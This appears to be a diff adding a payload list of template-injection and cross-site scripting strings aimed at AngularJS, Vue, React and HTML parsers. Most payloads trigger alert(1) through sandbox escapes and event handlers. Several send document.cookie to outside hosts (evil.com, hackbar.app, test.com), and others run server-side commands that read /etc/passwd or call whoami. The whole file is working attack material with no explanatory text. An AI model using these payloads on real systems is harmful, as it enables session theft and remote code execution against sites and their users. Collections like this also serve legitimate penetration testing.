@@ -1,0 +1,78 @@
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
+{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+{{constructor.constructor('alert(1)')()}}
+{{[].map.constructor('alert(1)')()}}
+{{[].find.constructor('alert(1)')()}}
+{{[].reduce.constructor('alert(1)')()}}
+{{[].filter.constructor('alert(1)')()}}
+{{[].every.constructor('alert(1)')()}}
+{{[].some.constructor('alert(1)')()}}
+{{[].forEach.constructor('alert(1)')()}}
+{{[].sort.constructor('alert(1)')()}}
+{{([]+[]).constructor.constructor('alert(1)')()}}
+{{''.constructor.constructor('alert(1)')()}}
+<p ng-init="constructor.constructor('alert(1)')()">
+<form ng-click="$event.target.ownerDocument.defaultView.alert(1)">
+<form ng-init="$event.target.ownerDocument.defaultView.alert(1)">
+<img src="x" onerror="alert(1)" />{{constructor.constructor('alert(1)')()}}
+<img src="x" onerror="alert(1)" ng-repeat="img in [].constructor.constructor('alert(1)')()">
+<img src="x" onerror="alert(1)" ng-if="[].constructor.constructor('alert(1)')()">
+<iframe src="javascript:alert(1)" ng-if="$eval('[].constructor.constructor(\\'alert(1)\\')()')">
+React.createElement('div', {dangerouslySetInnerHTML: {__html: '<img src=x onerror=alert(1)>'}})
+React.createElement('div', null, {toString: function() { alert(1); return ''; }, valueOf: function() { alert(1); return ''; }})
+<iframe srcdoc="<script>alert(parent.document.domain)</script>"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}
+{{a=(constructor).constructor('return this')();a.console.log('XSS');}}
+{{(_=prompt)()}}
+{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
+javascript:void(document.body.innerHTML="<iframe onload='alert(`XSS`)'>")
+<div id="app"><user-info v-html="'<img src=1 onerror=alert(1)>'"></user-info></div>
+{{constructor.constructor('fetch("https://test.com", {mode: "no-cors", method: "POST", body: document.cookie})')()}}
+<a href="#" @click="$nextTick(() => { alert(1) })">Click me</a>
+<form @submit.prevent="$nextTick(() => { alert(1) })">
+{{this.$nextTick(() => { alert(1) })}}
+{{$nextTick(() => { alert(1) })}}
+<div :style="'font-family:\';\x27,alert(1),\'\'"></div>
+Vue.prototype.__defineSetter__('x', function(v) { alert(1) }); app.x = 1
+<img src=x onerror=this.__proto__.innerHTML%3d`<div/onmouseover%3dalert(1)>x`>
+<img src=x onerror=this.__proto__.innerHTML%3d`<div/onmouseover%3dalert(document.domain)>x`>
+<img src=x onerror="this.__defineGetter__('src',function(){alert(1)})">
+<img src=x onerror="this.__proto__.__defineGetter__('src',function(){alert(1)})">
+{{constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd')}}
+{{constructor.constructor('return process')().mainModule.require('fs').readFileSync('/etc/passwd').toString()}}
+{{'a'.constructor.constructor('alert(1)')()}}
+{{'a'.toString().constructor.constructor('alert(1)')()}}
+{{{}[Object.keys({})[0]].constructor.constructor('alert(1)')()}}
+{{[].pop.constructor('alert(1)')()}}
+{{[].pop.constructor.constructor('alert(1)')()}}
+{{(_=[].pop,_._=_.__proto__,_.__.constructor)('alert(1)')()}}
+{{constructor.constructor('this.parentNode.innerHTML="<img src=x onerror=alert(1)>"')()}}
+{{constructor.constructor('require("child_process").exec("whoami")')()}}
+{{_=''.constructor;_=_.constructor;$=_('return process')();$env=$.$env||$.environment;$env&&$env['COMPUTERNAME']?$=$env['COMPUTERNAME']:$=$.mainModule.require('os').hostname()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
+{{config.onLoad.toString().constructor('alert(1)')()}}
+{{config.onClick.toString().constructor('alert(1)')()}}
+{{resource.data.toString().constructor('alert(1)')()}}
+<script>throw new Error("XSS via {{constructor.constructor('alert(1)')()}}")</script>
+<script>window.__defineGetter__('x',function(){throw new Error("XSS via {{constructor.constructor('alert(1)')()}}")})</script>
+<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/ng/login#x1'+eval('fetch(`hackbar.app?c=${document.cookie}`)') //"></textarea></div>
+<div ng-app ng-csp><input autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/ng/login#x1'+eval('alert(window.origin)')"></div>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+"--></script><script>alert(1)</script>
+</script><script>alert(1)</script>
+</script><img src=x onerror=alert(1)>
+e=new Error(); e.toString = () => { throw new Error("XSS"); }; throw e;
+<script>{{constructor.constructor('alert(1)')()}}</script>
+<div ng-include="'data:text/html,<script>alert(1)</script>'"></div>
+<div ng-include="'data:application/x-javascript,alert(1)'"></div>
+<div ng-include="'javascript:alert(1)'"></div>
+<div ng-include="'http://evil.com/xss.html'"></div>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<math><mtext><table><mglyph><svg><mtext><textarea><a title="</textarea><iframe onload='alert(1)'></iframe>"></a></math>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+require("child_process").exec('curl https://evil.com?cookie='+document.cookie)
